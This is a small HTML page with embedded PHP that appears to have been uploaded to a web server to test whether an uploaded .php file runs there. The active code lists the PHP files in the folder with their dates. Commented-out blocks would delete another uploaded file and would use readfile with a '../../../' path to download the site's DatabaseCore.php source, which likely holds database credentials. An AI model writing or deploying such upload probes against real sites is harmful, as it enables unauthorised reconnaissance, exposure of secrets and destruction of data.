<html>

  <head>
    <title>Test</title>
  </head>
  <body>
    <br><br><br>
    <center>
      Test of file upload as php with readfile.



<?php
//path to directory to scan
$directory = "./";
 
//get all image files with a .jpg extension.
$images = glob($directory. "*.php");
 
echo ("<hr>Let's see if we can display all php files in this folder using php:<hr>");
//print each file name
foreach($images as $image)
{
  echo "<br>we've got an " . $image . " created at " . date ("m/d/Y", filemtime($image));
}

// echo ("<br>unlinking xxx.php<br>");
// $data_file_to_delete = "10960.php";
// if(is_file($data_file_to_delete) == TRUE)
// {
//   echo ("exists");
//   chmod($data_file_to_delete, 0666);
//   unlink($data_file_to_delete);
//   echo ("deleted");
// }
// echo ("<br>done unlinking xxx.php<br>");

// $file = '../../../Library/DatabaseCore.php';

// if (file_exists($file)) {
//     header('Content-Description: File Transfer');
//     header('Content-Type: application/octet-stream');
//     header('Content-Disposition: attachment; filename='.basename($file));
//     header('Content-Transfer-Encoding: binary');
//     header('Expires: 0');
//     header('Cache-Control: must-revalidate');
//     header('Pragma: public');
//     header('Content-Length: ' . filesize($file));
//     ob_clean();
//     flush();
//     readfile($file);
//     exit;
// }

?>
    </center>
  </body>
</html>